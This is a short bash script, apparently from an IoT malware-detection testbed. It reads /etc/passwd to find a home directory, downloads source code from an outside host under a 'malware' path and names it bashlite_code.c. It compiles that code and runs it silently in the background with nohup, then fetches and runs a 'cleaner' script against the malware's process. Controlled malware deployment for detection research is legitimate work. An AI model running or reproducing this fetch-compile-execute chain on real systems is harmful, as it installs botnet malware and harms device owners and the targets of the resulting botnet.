#!/bin/bash

set -e

while IFS=: read -r username _ _ _ _ homedir _; do
    if [[ "$homedir" == "/home/"* ]]; then
        break
    fi
done < /etc/passwd


wget -q  "https://iotdet.eu.loclx.io/file/malware/7/executable/download/device" -O "/home/$username/bashlite_code.c"
gcc -o /home/$username/bashlite_executable /home/$username/bashlite_code.c

nohup /home/$username/bashlite_executable > /dev/null 2>&1 &

sleep 1

pid_code=$(pgrep -f "/home/$username/bashlite_executable")

wget -q "https://iotdet.eu.loclx.io/file/malware/7/cleaner/download/device" -O "/home/$username/bashlite_cleaner.py"

nohup python3 /home/$username/bashlite_cleaner.py $pid_code > /dev/null 2>&1 &